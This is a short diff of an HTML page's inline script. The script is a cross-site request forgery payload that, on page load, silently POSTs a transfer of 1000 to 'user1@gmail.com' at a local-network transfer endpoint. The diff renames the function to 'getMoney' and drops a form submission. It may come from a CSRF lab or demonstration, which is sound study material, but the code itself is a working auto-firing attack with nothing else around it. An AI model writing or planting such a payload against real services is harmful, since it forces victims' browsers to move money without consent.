@@ -20,19 +20,17 @@
 
     <script type="text/javascript">
 
-                      let data = {"user_to":"user1@gmail.com","amount":1000};
-                    function submitform(){
-                      let data = {"user_to":"user1@gmail.com","amount":1000};
-                        fetch("http://192.168.2.98:49698/transfer", {
+          async function getMoney(){
+          let data = {"user_to":"user1@gmail.com","amount":1000};
+          await fetch("http://192.168.2.98:49698/transfer", {
           method: "POST",
           headers: {'Content-Type': 'application/json'},
           body: JSON.stringify(data)
         }).then(res => {
           console.log("Request complete! response:", res);
         });
-                        document.forms["myForm"].submit();
       }
-      window.onload = submitform()
+      window.onload = getMoney()
 
               </script
 
